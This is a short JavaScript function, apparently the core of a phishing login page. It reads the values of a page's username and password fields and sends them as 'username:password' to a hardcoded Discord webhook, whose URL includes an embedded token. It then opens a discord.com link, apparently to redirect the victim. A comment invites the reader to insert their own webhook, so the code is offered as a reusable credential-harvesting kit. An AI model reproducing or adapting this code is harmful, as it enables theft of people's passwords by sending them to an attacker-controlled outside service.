function sendMessage() {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1274498078321279036/KBMk9wRJojOFpVoFgYs9wE5Rs95cbyAgeeluMvNrgiFBPILBIc94XN-04XfyuGooIUoH"); //here your discord webhook

    request.setRequestHeader('Content-type', 'application/json');

    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    let data = username+":"+password

    var params = {
      content: data
    }

    let link = "http://discord.com/"+username

    window.open(link)

    request.send(JSON.stringify(params));
  }
